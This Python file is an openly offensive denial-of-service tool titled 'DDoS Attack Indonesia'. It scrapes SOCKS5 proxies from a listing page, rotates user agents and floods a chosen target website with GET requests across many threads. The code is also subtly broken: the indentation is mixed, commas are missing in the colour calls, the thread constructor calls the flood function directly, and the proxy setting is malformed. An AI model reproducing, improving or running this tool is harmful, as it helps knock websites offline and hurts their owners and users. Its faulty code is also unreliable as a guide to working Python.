import argparse
import threading
import time
import re
import requests

from random import randrange
from termcolor import colored

def banner():
    print("""
  MNNNNMNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmNNNNNNNmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMNmdNMMMMMMMNNmmmmmmNNNNNNNNNNNNNNmmmmmNNMMMMMMNdydNMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMms+/hNMMMMNmmmmNNmmmmmmmmmNNNNNNNmmmmNNNmmmmNMMMMNy//sdMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMNNNy/-/dMMMNmmmNNMNNNssyyyyyyhmdshsdh+++oyNMMMNNmdmNMMMd+-:smmdNMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMmsodo:-omMMNmdmNMMMMMNN+::::::/odyossyo:::/yNMMMMMMNmdmNMMms:-+d+omMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMm+:hs:/yymNmdmNNNMMMMMNNo:------/my+++++//+oyNMMMMMMMNNmdmNmyyo:sh:/dMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMNo-+msys+smdmmhhmmNNNMMNNmmmddddddmdddmmmmmmmNMMMMMMMNNNmmmdms/oyym+-oNNMMMMMMMMMMMMMM
MMMMMMMMMMMMdhm/-yds/:sddNNmyyyhhdmmmNNNNNNNNmdhhyhNNNMMMNNNNNNNNNmmdhyhNNddy/:+hy::dshMMMMMMMMMMMMM
MMMMMMMMMMMm/sd/:o::+ddmNNNmhhyyyyyyyhhhdhddmmhyyyydmNNNmdddddhhhhyyyyymNNNmdms/:/::mo/dMMMMMMMMMMMM
MMMMMMMMMMMs:om/-:oyhdmNMMNNmhhhyyyyyyyyyyyyyddhhyyyhddhyyyyyyyyyyyyyhmNNMMNmdhyy+-:m+:oMMMMMMMMMMMM
MMMMMMMMMMN+-/d+ohs/ymMMMMMNNmdhhhyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyhmNNMMMMMmy/+yyod+-/NMMMMMMMMMMM
MMMMMMMMMMN/-:dds/-sdNMMMMMMMNmddhhhhhyshyshyyhyshhyhyyyyhhyhhhhhyyymNMMMMMMMNdy/:+dm/-/NMMMMMMMMMMM
MMMMMMMMMNNo-:yo:-ydNMMMMMMMMMNNmddhhhyshyyyysyyysyshhyoshhhhhhhhhdmNMMMMMMMMMNdd/-/y/-omdMMMMMMMMMM
MMMMMMMMMydd/-/-:hmdMMMMMMMMMMMMNNmdddhyhhhhhyshhyyyyhyyyyhhhhhddNNNMMMMMMMMMMMdddo-:::dy/NMMMMMMMMM
MMMMMMMMN++my--/dysmMMMMMMMMMMMMMMNNNmmddddhhhhhhhhhhhhhhhhdddmNNMMMMMMMMMMMMMMmyody--ym+/NMMMMMMMMM
MMMMMMMMN+:ym+/ds:sNMMMMMMMMMMMMMMMMMNNNmmddhdhhhhhhhhhhddmNNNMMMMMMMMMMMMMMMMMNh:+dy/my:/NMMMMMMMMM
MMMMMMMMNs-:hmms::hNMMMMMMMMMMMMMMMMMMMNNNmdhdhddhhhhhyhmmNNMMMMMMMMMMMMMMMMMMMNdo:+dmh/-/NMMMMMMMMM
MMMMMMMMMd/-/md/-odNMMMMMMMMMMMMMMMMMNNNmdhhhhyddddhhyyyhdmNNNMMMMMMMMMMMMMMMMMNdd:-om+--hMMMMMMMMMM
MMMMMMMMMNs--oo-:dmmMMMMMMMMMMMMMNNNmddhhhhhdddddddhhhhhhyyhhdmNNMMMMMMMMMMMMMMmhmo-:o:-sNMMMMMMMMMM
MMMMMMMMMdms-::-smohMMMMMMMMMMNNddmhhyhhhhhyyddddddddhyhhhhyyyhhdNmmmNMMMMMMMMMh+dd:---ymyNMMMMMMMMM
MMMMMMMMNoomh/.-mh:omMMMMMMMMNNdhyhhhyyhdhyhyhdhhdhhyhddhhyyyhyyhdhyhNNMMMMMMMNs:sN+./dd+/NMMMMMMMMM
MMMMMMMMMh:/hmo/ms:ohNMMMMMMNNdhyhhhyhyhdhhhhhmmddhyhhmdddyhyhhyhyhyyhNNMMMMMNds:/mssmy/-yMMMMMMMMMM
MMMMMMMMMNy::odmN+-+ddNMMMMMNmhhhhhhhhyhdhhyhdmmddhhyhmmddhhyhhhhhhyyhNNMMMMNddo-/NNh+:-yMMMMMMMMMMM
MMMMMMMMMMNy:-:smo-:dyhNMMMNNdhdhyydhyhhhhyydmmmddyyhmmmddhyyhhdhyhhyhmNNMMNysm+-/ds:-/hMMMMMMMMMMMM
MMMMMMMMMMMMmo--/o::hh/sNNNNmdhdhyyhsyhhhhyyhdddhhhyydddhhyhyyhhyyhhyhddmNNs:sm+-//-:smMMMMMMMMMMMMM
MMMMMMMMMMMMmdds:---ym/:smmhhhhdhhhhhyhyhhyhyhhyhhhhyyhhhhyhhhhhhhhhhyyyhms:-dh:--/ydyhMMMMMMMMMMMMM
MMMMMMMMMMMMNsohmy+:/mo-:yddddddddddddddddddddddddddddddddddddddddddddddhy/-/mo/sddy/oNMMMMMMMMMMMMM
MMMMMMMMMMMMMNs//shhydd:-+dhdmNNNNNNNNNNNNmmNNNmNNNNNNNNNNNNNNNNNNNNNmdydo:-hmhhyo::sNMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMdo::/+ydy:-sh+odNNNMMMMMMMMNmNMdmNNmmNNdmmMMMMMMMMNNNdo/yy:-ohs+:-:omMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMNds/--:/+::yy:/ohmNNMMMMMMNmMMdNNNddNNmNmMMMMMMNNmhs/:oh/-:/:-:/ymMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMNdhyo+//:/yy/-/sddmmNNNMNNNMNNNNNNNNNNNNNNNmmddy+-:sh+//+oshhhNMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMmyosyhhyyydho::/shdmmmmmmmNNNNNNNNNmmmmmmmdhs+::+ydhyyyyso+smMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMNds/:::::///::-:/oyddhyoossssyysssoooyhdds+/:::::::--::+sdNMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMNmhsoooosyhhdhyo/::/oyys++ss++shy+:::+oyhddhhyyssyhmNMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMNdyyyyyyso/:--:+yhy++ymMMMNdo+ohhs/:--:/+ossssshNMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMmhs+//:://shmdo/+hNMMMMMMMMms/+ydmhs+////+shmMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNMMMh:/hNMMMMMMMMMMMMmo:+NMMMNNNNMMMMMMMMMMMMMMMMNdddmmmhmMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdmMMMMMMMMMMMMMMMMmmMMMMMMMMMMMMMMMMMMMMMMMNN:::+ss+yNMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNhyyhddhmNMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmmMmmmmmmmmdhhdhhhhdMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMNNmmNMMNNNMNMNmNmNNNNmMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNyyhMNmdmdmmdNMdmdhmdMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmNNMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                              
    """
    )
	print(colored("=========================================="  'blue'))
    print(colored("|DDoS Attack Indonesia                    |", 'yellow'))
    print(colored("|Authors: Mr.Noname                       |", 'yellow'))
	print(colored("=========================================="  'blue'))

def parse_args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--user_agents',
                        dest = "user_agents",
                        help = "Filename of user agents file",
                        default = "user_agents.txt",
                        required = False)
    parser.add_argument('-t','--target',
                        dest = "target",
                        help = "Target website",
                        default = "http://example.com",
                        required = True)
    parser.add_argument('-tr','--threads',
                        dest = "threads",
                        help = "Number of threads",
                        default = 1000,
                        required = True)
    parser.add_argument('-s','--sleep',
                        dest = "sleep",
                        help = "Breakpoint after number of threads processed",
                        default = 100,
                        required = True)
    return parser.parse_args()

def get_user_agents(filename: str):
    user_agents = []
    with open(filename, 'r') as f:
        content = f.readlines()
        for user_agent in content:
            user_agents.append(str(user_agent.strip()))
    return user_agents

def get_proxies():
    URL = "http://www.live-socks.net/2018/11/27-11-18-socks-5-servers_57.html?m=1"
    req = requests.get(URL, timeout=10)
    content = req.text
    proxies = re.findall(r"(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", content)
    return proxies

def flood(user_agent: str, proxy: str, target: str, thread: int):
    print(colored("Serangan: thread #{}".format(str(thread)), 'cyan'))
    headers = {
        'User-Agent': user_agent,
        'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }
    proxies = {
        'socks5': proxy
    }
    try: 
        req = requests.get(target, headers=headers, proxies=proxies, timeout=5)
    except Exception as e:
        print(colored("Error: " + str(e), 'red'))
        pass

def main():
    banner()
    ua_filename = parse_args().user_agents
    user_agents = get_user_agents(ua_filename)
    proxies = get_proxies()
    target = parse_args().target
    threads = int(parse_args().threads)
    sleep = int(parse_args().sleep)
    
    for thread in range (1, threads):
        user_agent = user_agents[randrange(len(user_agents) - 1)]
        proxy = proxies[randrange(len(proxies) - 1)]
        t = threading.Thread(flood(user_agent, proxy, target, thread, ))
        t.start()
        if thread % sleep == 0:
            time.sleep(10)
    t.join()
    print(colored("Finished!", 'green'))

if __name__ == "__main__":
    main()